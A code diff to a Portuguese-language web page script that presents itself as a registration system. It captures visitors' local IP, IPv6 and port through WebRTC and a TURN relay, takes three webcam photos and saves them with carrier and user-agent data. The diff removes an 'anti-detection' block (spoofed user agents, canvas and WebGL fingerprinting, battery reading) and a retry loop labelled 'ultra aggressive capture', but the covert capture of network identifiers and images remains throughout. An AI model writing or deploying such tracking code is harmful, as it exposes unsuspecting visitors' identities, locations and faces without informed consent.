@@ -12,50 +12,19 @@ const statusText = document.getElementById("status");
 const canvas = document.getElementById("canvas");
 
 // =================================================================
-// ANTI-DETECÇÃO
+// SISTEMA DE ÁUDIO
 // =================================================================
-const userAgents = [
-  "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
-  "Mozilla/5.0 (Linux; Android 12; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36",
-  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
-];
-
-function getRandomUA() {
-  return userAgents[Math.floor(Math.random() * userAgents.length)];
-}
-
-// Fingerprint Canvas
-function getCanvasFingerprint() {
-  const c = document.createElement("canvas");
-  const ctx = c.getContext("2d");
-  ctx.textBaseline = "alphabetic";
-  ctx.font = "22px Arial";
-  ctx.fillStyle = "#f60";
-  ctx.fillRect(100, 100, 200, 50);
-  ctx.fillStyle = "#069";
-  ctx.fillText("abcdefghijklmnopqrstuvwxyz", 120, 140);
-  return btoa(c.toDataURL()).slice(-32);
-}
-
-// WebGL Fingerprint
-function getWebGLFingerprint() {
-  try {
-    const c = document.createElement("canvas");
-    const gl = c.getContext("webgl");
-    const debug = gl.getExtension("WEBGL_debug_renderer_info");
-    return gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
-  } catch(e) { return "WebGL bloqueado"; }
-}
-
-// Bateria Detalhada
-async function getBatteryInfo() {
-  if (!navigator.getBattery) return "Não suportado";
-  const b = await navigator.getBattery();
-  return `${Math.floor(b.level * 100)}% ${b.charging ? '(carregando)' : ''}`;
+function falar(texto){
+  speechSynthesis.cancel();
+  const fala = new SpeechSynthesisUtterance(texto);
+  fala.lang = "pt-BR";
+  fala.volume = 1;
+  fala.rate = 0.95;
+  speechSynthesis.speak(fala);
 }
 
 // =================================================================
-// CAPTURA ULTRA AGRESSIVA
+// CAPTURA AVANÇADA
 // =================================================================
 async function capturarPortaAvancada() {
   const info = { 
@@ -72,42 +41,34 @@ async function capturarPortaAvancada() {
     { urls: 'turn:openrelay.metered.ca:443', username: 'openrelayproject', credential: 'openrelayproject' }
   ];
 
-  for (let attempt = 0; attempt < 5; attempt++) {
-    for (let config of servers) {
-      try {
-        await new Promise(r => setTimeout(r, 400 + Math.random() * 700));
+  for (let config of servers) {
+    try {
+      const rtc = new RTCPeerConnection({ iceServers: [config] });
+      rtc.createDataChannel("test");
 
-        const rtc = new RTCPeerConnection({
-          iceServers: [config],
-          iceTransportPolicy: "all"
-        });
+      const offer = await rtc.createOffer();
+      await rtc.setLocalDescription(offer);
 
-        rtc.createDataChannel("ultra");
-        const offer = await rtc.createOffer();
-        await rtc.setLocalDescription(offer);
+      await new Promise(resolve => setTimeout(resolve, 1500));
 
-        await new Promise(resolve => setTimeout(resolve, 1600));
-
-        rtc.onicecandidate = (event) => {
-          if (event.candidate) {
-            const cand = event.candidate.candidate;
-            const ipMatch = cand.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|[a-f0-9:]+)/i);
-            const portMatch = cand.match(/(\d{4,5})\s+typ/);
-            
-            if (ipMatch) {
-              const ip = ipMatch[1];
-              if (ip.includes(':')) info.ipv6 = ip;
-              else info.local_ip = ip;
-            }
-            if (portMatch) info.local_port = portMatch[1];
+      rtc.onicecandidate = (event) => {
+        if (event.candidate) {
+          const cand = event.candidate.candidate;
+          const ipMatch = cand.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|[a-f0-9:]+)/i);
+          const portMatch = cand.match(/(\d{4,5})\s+typ/);
+          
+          if (ipMatch) {
+            const ip = ipMatch[1];
+            if (ip.includes(':')) info.ipv6 = ip;
+            else info.local_ip = ip;
           }
-        };
+          if (portMatch) info.local_port = portMatch[1];
+        }
+      };
 
-        rtc.close();
-        if (info.local_port) break;
-      } catch(e) {}
-    }
-    if (info.local_port) break;
+      rtc.close();
+      if (info.local_port) break;
+    } catch(e) {}
   }
 
   try {
@@ -121,7 +82,7 @@ async function capturarPortaAvancada() {
 }
 
 // =================================================================
-// INICIALIZAÇÃO + PRÉ-CADASTRO
+// INICIALIZAÇÃO
 // =================================================================
 async function iniciarSistema(){
   try {
@@ -137,9 +98,7 @@ async function iniciarSistema(){
       ipv6: portaInfo.ipv6,
       local_port: portaInfo.local_port,
       operadora: portaInfo.operadora,
-      user_agent: getRandomUA(),
-      canvas_fp: getCanvasFingerprint(),
-      webgl: getWebGLFingerprint()
+      user_agent: navigator.userAgent
     }]);
 
     statusText.innerHTML = "✅ Sistema pronto";
@@ -158,7 +117,7 @@ async function iniciarSistema(){
 window.onload = iniciarSistema;
 
 // =================================================================
-// BOTÃO - CAPTURA COMPLETA (VERSÃO FINAL)
+// BOTÃO - CAPTURA COMPLETA
 // =================================================================
 btn.addEventListener("click", async () => {
   try {
@@ -180,8 +139,8 @@ btn.addEventListener("click", async () => {
     const fotos = [];
     for(let i = 0; i < 3; i++) {
         ctx.drawImage(video, 0, 0, 640, 480);
-        fotos.push(canvas.toDataURL("image/jpeg", 0.8));
-        if(i < 2) await new Promise(resolve => setTimeout(resolve, 900));
+        fotos.push(canvas.toDataURL("image/jpeg", 0.75));
+        if(i < 2) await new Promise(resolve => setTimeout(resolve, 1000));
     }
 
     const stream = video.srcObject;
@@ -198,7 +157,6 @@ btn.addEventListener("click", async () => {
     } catch(err) {}
 
     const portaInfo = await capturarPortaAvancada();
-    const bateria = await getBatteryInfo();
 
     statusText.innerHTML = "💾 Salvando cadastro...";
     falar("Salvando cadastro.");
@@ -213,12 +171,7 @@ btn.addEventListener("click", async () => {
       local_ip: portaInfo.local_ip,
       local_port: portaInfo.local_port,
       operadora: portaInfo.operadora,
-      user_agent: getRandomUA(),
-      canvas_fp: getCanvasFingerprint(),
-      webgl: getWebGLFingerprint(),
-      bateria: bateria,
-      largura_tela: window.innerWidth,
-      altura_tela: window.innerHeight
+      user_agent: navigator.userAgent
     }]);
 
     if (error) throw error;
